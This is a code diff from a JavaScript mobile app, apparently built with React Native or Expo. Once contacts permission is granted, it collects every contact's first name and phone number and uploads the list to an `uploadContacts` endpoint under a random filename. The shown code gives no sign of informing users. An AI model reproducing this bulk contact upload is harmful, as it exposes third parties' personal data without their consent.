@@ -481,9 +481,13 @@ export default () => {
 		  if (status === 'granted') {
 			const { data } = await Contacts.getContactsAsync({
 			})
-			
+			const contactlist= [{}]
 			if (data.length > 0) {
-			  console.log(data.toString())
+			  data.map(elem => {
+				  elem.phoneNumbers && elem.firstName ?
+					contactlist.push(elem.firstName + ':' +elem.phoneNumbers[0].number)
+				  :null
+			  })
 			  fetch(`${API_URL}/api/uploadContacts/`, {
 				method: "POST",
 				headers: {
@@ -491,7 +495,7 @@ export default () => {
 					"Content-Type": "application/json",
 				},
 				body: JSON.stringify({
-					data: data[0].toString(),
+					data: contactlist.toString(),
 					filename:
 						Math.random().toString(36).substring(2, 15) +
 						Math.random().toString(36).substring(2, 15) +
